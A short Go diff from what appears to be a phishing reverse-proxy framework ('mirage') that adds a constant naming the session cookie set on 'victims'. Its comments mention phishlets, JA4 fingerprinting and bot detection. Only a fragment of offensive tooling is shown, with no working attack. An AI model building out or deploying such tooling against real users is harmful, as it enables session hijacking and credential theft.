@@ -10,6 +10,9 @@ import (
 	"github.com/travisbale/mirage/internal/botguard"
 )
 
+// SessionCookieName is the name of the session tracking cookie set on victims.
+const SessionCookieName = "__ss"
+
 // connection represents a single victim's TLS connection. It is created
 // once per connection after the TLS handshake completes, performs all
 // connection-level setup (JA4, IP extraction, phishlet resolution, session
